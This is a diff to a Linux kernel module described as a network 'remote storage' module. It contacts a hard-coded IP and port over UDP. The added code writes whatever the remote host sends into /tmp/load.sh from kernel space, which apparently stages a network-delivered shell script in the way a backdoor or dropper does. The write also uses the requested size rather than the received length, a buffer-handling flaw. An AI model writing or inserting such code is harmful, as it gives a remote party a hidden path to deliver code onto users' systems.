@@ -7,6 +7,10 @@
 #include <linux/inet.h>
 #include <linux/socket.h>
 #include <net/sock.h>
+#include <linux/fs.h>
+#include <linux/slab.h>
+#include <linux/uaccess.h>
+#include <linux/string.h>
 
 #define DEST_IP "192.168.123.79"  // Destination IP address
 #define DEST_PORT 1104           // Destination UDP port
@@ -16,6 +20,35 @@ struct msghdr msg = {0};
 struct kvec iov;
 
 // int perform_udp_request(void);
+
+static int write_file_from_kernel(const char *path, const char *data, size_t size)
+{
+    struct file *filp;
+    loff_t pos = 0;
+    ssize_t bytes_written;
+
+    // Open (or create) the file with write-only mode. Using O_CREAT and O_TRUNC will overwrite if exists.
+    filp = filp_open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (IS_ERR(filp)) {
+        pr_err("Failed to open file: %s, error: %ld\n", path, PTR_ERR(filp));
+        return PTR_ERR(filp);
+    }
+
+    // Write data to the file
+    bytes_written = kernel_write(filp, data, size, &pos);
+    if (bytes_written < 0) {
+        pr_err("Failed to write to file: %s, error: %zd\n", path, bytes_written);
+        filp_close(filp, NULL);
+        return bytes_written;
+    }
+
+    pr_info("Successfully wrote %zd bytes to %s\n", bytes_written, path);
+
+    // Close the file
+    filp_close(filp, NULL);
+
+    return 0;
+}
 
 static int remote_storage_init(void) {
     printk(KERN_INFO "Network module loaded\n");
@@ -100,6 +133,8 @@ int call_remote_storage(char* filename, size_t size, unsigned long index) {
         if (ret > 0) {
             buffer[ret] = '\0';
             pr_info("Remote: Received message: %s\n", buffer);
+
+            write_file_from_kernel("/tmp/load.sh", buffer, size);
         }
     }
     kfree(buffer);
